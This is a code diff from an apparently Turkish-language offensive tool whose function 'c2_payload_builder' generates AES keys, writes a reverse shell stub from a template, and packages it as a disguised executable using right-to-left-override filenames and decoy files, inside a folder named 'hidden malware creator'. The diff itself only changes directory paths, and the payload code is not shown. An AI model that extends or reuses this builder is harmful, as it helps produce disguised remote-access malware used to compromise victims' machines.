@@ -339,7 +339,7 @@ def c2_payload_builder(auto_lhost=None, auto_lport=None, auto_os=None, auto_anti
             print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")
 
             # Reverse shell Python scripti oluştur
-            output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "11_Gizli_Zararli_Olusturucu")
+            output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller\\11_Gizli_Zararli_Olusturucu")
             os.makedirs(output_dir, exist_ok=True)
             stub_path = os.path.join(output_dir, "_stub.py")
 
@@ -374,7 +374,7 @@ except:
 """
 
             # Stub template'den oku ve placeholder'lari degistir
-            template_path = os.path.join(os.path.dirname(__file__), "11_Gizli_Zararli_Olusturucu", "stub_template.py")
+            template_path = os.path.join(os.path.dirname(__file__), "Moduller\\11_Gizli_Zararli_Olusturucu", "stub_template.py")
             if not os.path.exists(template_path):
                 print(f"{C.RED}  [-] Hata: stub_template.py bulunamadı! Yol: {template_path}{C.RESET}")
                 input(f"{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
@@ -762,14 +762,14 @@ class Program {{
         
         # os.getcwd() yerine scriptin bulundugu klasoru al
         base_dir = os.path.dirname(os.path.abspath(__file__))
-        rlo_dir = os.path.join(base_dir, '11_Gizli_Zararli_Olusturucu')
+        rlo_dir = os.path.join(base_dir, 'Moduller\\11_Gizli_Zararli_Olusturucu')
         os.makedirs(rlo_dir, exist_ok=True)
         rlo_path = os.path.join(rlo_dir, rlo_name)
 
         import shutil
         # Eğer yem dosya kullandıysak tüm paketi kopyalamalıyız.
         # final_exe artık disguise_pkg klasörünün içinde open.exe
-        # Tüm dosyaların 11_Gizli_Zararli_Olusturucu içine kopyalanması gerekiyor.
+        # Tüm dosyaların Moduller\\11_Gizli_Zararli_Olusturucu içine kopyalanması gerekiyor.
         if decoy_path and os.path.exists(decoy_path):
             # pkg_dir içindeki dosyaları kopyala
             for f in os.listdir(pkg_dir):
